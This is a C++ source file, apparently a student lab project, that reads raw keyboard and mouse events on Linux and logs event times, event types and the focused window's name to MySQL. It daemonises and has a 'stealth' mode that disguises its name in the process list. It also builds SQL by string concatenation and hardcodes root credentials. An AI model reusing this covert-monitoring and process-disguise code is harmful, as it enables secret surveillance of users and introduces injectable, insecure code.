/****Proyecto 1 Laboratorio de Programacion******
********Araya, Luis   Bejarano, Mauricio*********
************************************************/

//Se agregan librerias basicas
#include <iostream>
#include <fstream> /*Para manejar archivos*/
#include <string>
#include <string.h> /* Para memset, strlen y otras funciones*/
#include <unistd.h> /*Para getopt, optarg*/
#include <stdlib.h> /* Para exit */
#include <sstream>
#include <stdexcept>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <linux/input.h>
#include <fcntl.h>

//Se añaden librerias para realizar la conexion entre mysql y c++
#include "mysql_connection.h"
#include "mysql_driver.h"
#include <cppconn/driver.h>
#include <cppconn/exception.h>
#include <cppconn/resultset.h>
#include <cppconn/statement.h>
#include <cppconn/prepared_statement.h>

//Se definen variables para realizar la conexion entre mysql y c++
#define EXAMPLE_HOST "localhost"
#define EXAMPLE_USER "root"
#define EXAMPLE_PASS "password"
#define EXAMPLE_DB "proyecto1"

//Se definen los archivos en los que se encuentran los eventos del teclado y del mouse
#define KEYFILE "/dev/input/by-path/platform-i8042-serio-0-event-kbd"
#define MOUSEFILE "/dev/input/mice" //alternativa: /dev/input/mouse0

using namespace sql;
using namespace std;

//Variable necesaria para enviar al modo stealth
bool stealth = false;
//Variable que contiene el nombre que se despliega en los procesos activos
string stealth_name = "";

//Funcion que imprime en consola la ayuda de como correr el programa
void print_help(char * program_name) {
  cout << "Ayuda para ejecutar el programa de forma correcta" << endl;
}    

/*
 * La siguiente funcion logra que un "ps ax" no devuelva el nombre del ejecutable.
 * Se reemplaza el nombre original con el nombre que se desea para que aparezca en la lista que despliega el comando "ps ax".
 */
void go_stealth(int &argc, char **argv) {
  int argv_lengths[argc];
  //Se recorren los argumentos 
  //Se define el tamano de memoria necesaria para cada argumento
  for (int i=0; i<argc; i++) {
    argv_lengths[i] = strlen(argv[i]);
    memset(argv[i], '\0', argv_lengths[i]);
  } 
  //Se define el tamano maximo que puede tener el nombre falso
  int max_argv_length = 16;
  int maximum_size = strlen(stealth_name.c_str())+1;
  char * name_to_split = new char[maximum_size];
  memset(name_to_split, 0, maximum_size);
  strcpy(name_to_split, stealth_name.c_str());
  char * token = strtok(name_to_split, " ");
  int argv_index = 0;
  strncpy(argv[argv_index], token, argv_lengths[argv_index]);
  argv_index++;
  while ((token = strtok(NULL, " ")) != NULL) {
    strncpy(argv[argv_index], token, argv_lengths[argv_index]);
    argv_index++;
    if (argv_index >= argc)
      break;
  }
  delete[] name_to_split;
}

/*
 * Esta funcion logra separar los argumentos introducidos en la ejecucion del programa 
 */ 
void parse_arguments(int argc, char **argv) {
//Variable que contendra los distintos switches que puede tener el programa
char opt;
//Se analiza si colocar la informacion o no
//Se se imprime la ayuda se sale del programa
if ((argc == 1) || (argv[1] == "--help") || (argv[1] == "-h") || (argv[1] == "-help")) {
  print_help(argv[0]);
  exit(EXIT_SUCCESS);
}
//Se analizan todos los argumentos
//En este caso la funcion getopt, permite analizar lo que esta despues de la opcion -s
//Si se desean agregar mas opciones, en lugar de "s:" deberia ser "s:d:t:" por ejemplo
while ((opt = getopt (argc, argv, "s:")) != -1)
  //Por el momento solo maneja la opciones -s, pero se podria ampliar en el futuro
  switch (opt) {
    case 's':
      // Se activa el stealth mode 
      stealth = true;
      // Se guarda el nombre falso del programa
      stealth_name = optarg;
      break;
    default:
      cout << "Se introducieron parametros no validos." << endl ;
      print_help(argv[0]);
      exit(EXIT_SUCCESS);
  }
}

//Funcion que realiza la conexion entre c++ y mysql
bool mysqlConexion(int tipo, string url, const string user, const string pass, const string database, int tiempo1, string tipo1, string ventana1) {

  try {
    //Se definen las variables necesarias para realizar la conexion con mysql
    sql::Driver *driver;
    driver = get_driver_instance();
    std::auto_ptr<sql::Connection> con(driver->connect(url, user, pass));
    con->setSchema(database);
    std::auto_ptr<sql::Statement> stmt(con->createStatement());

    if (tipo == 1) { // En este modo se inicializa mysql
      cout << "Ejecutando Conexion con mySQL desde C++" << endl;
      //Estan serian los comandos para crear la tabla en la base de datos y leer el archivo de entrada en caso de que no se encuentre en la base de datos
      //stmt->execute("CREATE TABLE example (TIEMPO INT NOT NULL, TIPO VARCHAR(100) NOT NULL, VENTANA VARCHAR(100) NOT NULL);");
    }
    else if (tipo == 2) { // En este modo se agregan datos a la base de datos
      ostringstream strstr;
      strstr <<  "INSERT INTO example (TIEMPO, TIPO, VENTANA) VALUES('"<< tiempo1 << "', '" << tipo1 << "', '" << ventana1 << "');";
      string str = strstr.str();
      stmt->execute(str);
    }
  }
  //Se encuentran las excepciones de sql 
  catch (sql::SQLException &e) {
    cout << "# ERR: SQLException in " << __FILE__;
    cout << "(" << __FUNCTION__ << ") on line " << __LINE__ << endl;
    cout << "# ERR: " << e.what();
    cout << " (MySQL error code: " << e.getErrorCode();
    cout << ", SQLState: " << e.getSQLState() << " )" << endl;
    return false;
  }

  return true;
}

//Funcion del primer thread que detecta los eventos del mouse
void* detectarMouse(void*) {
    //Se definen las variables que guardara informacion importante del archivo del mouse
    int fd_mouse;
    struct input_event ie_mouse;
    char caracteres1[100];
    FILE *fp1;
    bool conexion = true;

    string url = EXAMPLE_HOST;
    const string user = EXAMPLE_USER;
    const string pass = EXAMPLE_PASS;
    const string database = EXAMPLE_DB;

    //Se abre el archivo que contiene todos los eventos del mouse
    if((fd_mouse = open(MOUSEFILE, O_RDONLY)) == -1) {
        perror("opening mouse");
        exit(EXIT_FAILURE);
    }

    while (read(fd_mouse, &ie_mouse, sizeof(struct input_event))) { 
        //printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n", ie_mouse.time.tv_sec, ie_mouse.time.tv_usec, ie_mouse.type, ie_mouse.code, ie_mouse.value);
        system("cat /proc/$(xdotool getwindowpid $(xdotool getwindowfocus))/comm > ventana1.data");
        fp1 = fopen ( "ventana1.data", "r" );
        fgets(caracteres1,100,fp1);
        fclose ( fp1 );
        /*printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n", ie_mouse.time.tv_sec, ie_mouse.time.tv_usec, ie_mouse.type, ie_mouse.code, ie_mouse.value);
        cout << "En: "<< caracteres1 << endl;*/
        conexion = mysqlConexion(2, url, user, pass, database, ie_mouse.time.tv_sec, "mouse", caracteres1);
    }

}

//Funcion del segundo thread que detecta los eventos del teclado
void* detectarTeclado(void*) {
    //Se definen las variables que guardara informacion importante del archivo del teclado
    int fd_teclado;
    struct input_event ie_teclado;
    char caracteres2[100];
    FILE *fp2;
    bool conexion = true;

    string url = EXAMPLE_HOST;
    const string user = EXAMPLE_USER;
    const string pass = EXAMPLE_PASS;
    const string database = EXAMPLE_DB;

    //Se abre el archivo que contiene todos los eventos del teclado
    if((fd_teclado = open(KEYFILE, O_RDONLY)) == -1) {
        perror("opening keyboard");
        exit(EXIT_FAILURE);
    }
    while (read(fd_teclado, &ie_teclado, sizeof(struct input_event))) { 
        system("cat /proc/$(xdotool getwindowpid $(xdotool getwindowfocus))/comm > ventana2.data");
        fp2 = fopen ( "ventana2.data", "r" );
        fgets(caracteres2,100,fp2);
        fclose ( fp2 );
        /*printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n", ie_teclado.time.tv_sec, ie_teclado.time.tv_usec, ie_teclado.type, ie_teclado.code, ie_teclado.value);
        cout << "En: "<< caracteres2 << endl;*/
        conexion = mysqlConexion(2, url, user, pass, database, ie_teclado.time.tv_sec, "teclado", caracteres2);
    }
}

/*
 * Porgrama principal
 */
int main(int argc, char **argv) { 

  //Se definen variables necesarias para la conexion entre mySQL y C++
  string url = EXAMPLE_HOST;
  const string user = EXAMPLE_USER;
  const string pass = EXAMPLE_PASS;
  const string database = EXAMPLE_DB;
  
  bool conexion = true;
  //Se llama a funcion que realiza la conexion con mysql
  conexion = mysqlConexion(1, url, user, pass, database, 1, "NULL", "NULL");

  if (conexion) {
    cout << "Conexion con SQL realizada correctamente" << endl;
  }
  else{
    cout << "No se logro crear conexion con SQL" << endl;
    exit(EXIT_FAILURE);
  }

  //Se analizan los parametros que el usuario ejecuto
  parse_arguments(argc, argv);

  //Se analiza si activar el modo stealth
  if (stealth) {
    go_stealth(argc, argv);
  }

  //Los siguientes comandos permiten enviar el programa a segundo plano

  //Con la funcion fork se crea un proceso "child"
  pid_t pid = fork();
  //Se detecta error, fork funciono de forma erronea
  if (pid < 0) {
    exit(EXIT_FAILURE);
  }
  //Se creo el proceso child de forma correcta
  if (pid > 0) {
    //Se imprime el PID que se obtuvo para el proceso "child"
    cout << pid << endl;
    exit(EXIT_SUCCESS); //En este momento el proceso "Parent" se muere y queda el proceso "child"
  }

  //Se crea un SID para el proceso "child"
  pid_t sid = setsid();
  //Sucedio un error
  if (sid < 0) {
    exit(EXIT_FAILURE);
  }
  //Se obtuvo el SID de forma correcta

  //Se crean los hilos
  pthread_t t1, t2;
  //Se llaman a los hilos
  pthread_create(&t1, NULL, &detectarMouse, NULL);
  pthread_create(&t2, NULL, &detectarTeclado, NULL);
  //Se espera a que los hilos terminen
  pthread_join( t1, NULL);
  pthread_join( t2, NULL);
  cout << "Finalizando programa" << endl;
  return 0;
}